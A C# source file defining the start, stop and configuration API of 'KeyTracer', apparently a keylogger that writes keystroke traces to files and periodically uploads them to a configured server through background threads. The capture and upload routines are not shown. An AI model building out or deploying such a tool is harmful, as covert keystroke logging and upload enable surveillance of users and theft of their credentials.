using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;

namespace KeyTracer
{
    public static class KeyTracerAPI
    {
        public static int Start()
        {
            try
            {
                StartUp.Configure();

                Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
                uploadWork.Start();

                Thread reConnect = new Thread(new ThreadStart(Threads.Reconnect));
                reConnect.Start();

                Thread work = new Thread(new ThreadStart(Threads.DoWork));
                work.Start();

                return 1;
            }
            catch
            {
                return 0;
            }
        }

        public static int Start(Config conf)
        {
            try
            {
                Consts.serverLocation = conf.serverLocation;
                Consts.Server = conf.Server;

                Consts.serverKeyTraces = conf.serverKeyTrace;
  
                Consts.keytraceFileName = conf.keytraceFileName;
                Consts.serverFileName = conf.serverFileName;

                Consts.programPath = conf.programPath;
                Consts.tempPath = conf.tempPath;

                Consts.keytracePath = conf.keytracePath;
                Consts.serverPath = conf.serverPath;

                Consts.uploadDelay = conf.uploadDelay;
                Consts.serverTimeout = conf.serverTimeout;
                Consts.matchDelayTime = conf.matchDelayTime;

                Consts.isConnected = conf.isConnected;
                Consts.isUploading = conf.isUploading;

                Consts.doWork = conf.doWork;

                Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
                uploadWork.Start();

                Thread reConnect = new Thread(new ThreadStart(Threads.Reconnect));
                reConnect.Start();

                Thread work = new Thread(new ThreadStart(Threads.DoWork));
                work.Start();

                return 1;
            }
            catch
            {
                return 0;
            }
        }

        public static int Start(bool offline = false)
        {
            try
            {
                StartUp.Configure();

                Thread work = new Thread(new ThreadStart(Threads.DoWork));
                work.Start();

                return 1;
            }
            catch
            {
                return 0;
            }
        }

        public static int Stop()
        {
            try
            {
                Consts.doWork = false;

                return 1;
            }
            catch
            {
                return 0;
            }
        }

        public struct Config
        {
            public string serverLocation;
            public string Server;

            public string serverKeyTrace;

            public string keytraceFileName;
            public string serverFileName;

            public string programPath;
            public string tempPath;

            public string keytracePath;
            public string serverPath;

            public int uploadDelay;
            public int serverTimeout;
            public int matchDelayTime;

            public bool isConnected;
            public bool isUploading;

            public bool doWork;
        }
    }
}
